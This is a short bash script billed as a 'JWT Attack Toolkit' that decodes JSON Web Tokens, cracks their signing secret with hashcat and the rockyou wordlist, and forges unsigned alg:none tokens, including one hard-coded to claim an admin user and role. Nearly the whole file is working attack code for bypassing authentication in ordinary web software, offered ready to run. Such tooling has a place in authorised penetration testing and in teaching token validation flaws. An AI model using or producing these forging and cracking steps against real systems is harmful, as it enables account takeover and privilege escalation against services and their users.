#!/bin/bash
# JWT Attack Toolkit
# Usage: ./jwt_pwn.sh <token> [action]

TOKEN=$1
ACTION=${2:-decode}

if [ -z "$TOKEN" ]; then
    echo "Usage: $0 <jwt_token> [decode|crack|forge|none]"
    exit 1
fi

case $ACTION in
    decode)
        echo "[*] Decoding JWT..."
        HEADER=$(echo "$TOKEN" | cut -d'.' -f1)
        PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2)
        # Add padding
        HEADER="$HEADER$(printf '=%.0s' $(seq 1 $((4 - ${#HEADER} % 4))))"
        PAYLOAD="$PAYLOAD$(printf '=%.0s' $(seq 1 $((4 - ${#PAYLOAD} % 4))))"
        echo "Header:"
        echo "$HEADER" | base64 -d 2>/dev/null | jq . 2>/dev/null || echo "$HEADER" | base64 -d 2>/dev/null
        echo "Payload:"
        echo "$PAYLOAD" | base64 -d 2>/dev/null | jq . 2>/dev/null || echo "$PAYLOAD" | base64 -d 2>/dev/null
        ;;
    crack)
        echo "[*] Cracking JWT secret..."
        if [ -z "$WORDLIST" ]; then
            WORDLIST="/usr/share/wordlists/rockyou.txt"
        fi
        hashcat -m 16500 "$TOKEN" "$WORDLIST"
        ;;
    forge)
        echo "[*] Forging JWT with alg:none..."
        HEADER='{"alg":"none","typ":"JWT"}'
        PAYLOAD='{"user":"admin","role":"admin"}'
        HEADER_B64=$(echo -n "$HEADER" | base64 | tr '+/' '-_' | tr -d '=')
        PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 | tr '+/' '-_' | tr -d '=')
        echo "${HEADER_B64}.${PAYLOAD_B64}."
        ;;
    none)
        echo "[*] Testing alg:none bypass..."
        HEADER=$(echo "$TOKEN" | cut -d'.' -f1)
        HEADER_B64=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
        PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2)
        echo "Forged token: ${HEADER_B64}.${PAYLOAD}."
        ;;
    *)
        echo "Unknown action: $ACTION"
        echo "Actions: decode, crack, forge, none"
        exit 1
        ;;
esac
